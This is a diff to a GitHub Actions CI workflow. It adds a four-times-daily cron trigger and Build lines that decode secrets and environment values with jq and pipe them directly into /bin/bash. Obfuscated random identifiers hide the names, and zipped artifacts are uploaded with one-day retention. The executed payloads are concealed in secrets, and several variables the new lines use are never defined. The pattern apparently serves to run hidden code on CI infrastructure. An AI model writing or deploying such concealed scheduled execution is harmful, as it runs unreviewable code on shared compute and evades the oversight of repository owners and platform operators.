@@ -2,6 +2,8 @@ name: CI
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '30 0,6,12,18 * * *'
 env:
   CI: true
 concurrency:
@@ -14,15 +16,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: Build
         env:
-          e55: ${{ secrets.e55 }}
+          ti819: ${{ secrets.ti819 }}
         run: |
-          printf '%s' "$e55" | jq -r .qrje16 | /bin/bash
-          printf '%s' "$h94502" | jq -r .f680 | /bin/bash
-          printf '%s' "$rmyz894" | jq -r .wm288 | /bin/bash
+          printf '%s' "$ti819" | jq -r .jnox805 | /bin/bash
+          echo $z66 | jq -r .wtmwj0342 | /bin/bash
+          printf '%s' "$xzf6028" | jq -r .ez013 | /bin/bash
+          echo $ygp602 | jq -r .olawb4 | /bin/bash
+          echo $reev61 | jq -r .kg27436 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
         with:
-          name: w45qzpWK
+          name: mnIwOdVg
           path: "*.zip"
           retention-days: 1
